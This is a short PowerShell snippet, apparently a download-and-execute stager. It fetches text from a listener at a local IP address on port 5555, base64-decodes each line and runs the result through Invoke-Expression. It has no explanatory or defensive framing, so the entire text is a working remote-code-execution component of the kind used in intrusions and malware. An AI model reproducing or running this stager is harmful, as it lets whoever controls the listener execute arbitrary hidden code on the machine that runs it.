ForEach ($line in $((New-Object Net.WebClient).DownloadString('http://192.168.0.248:5555/p') -split "\n"))
{
    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($line)) | IEX
}
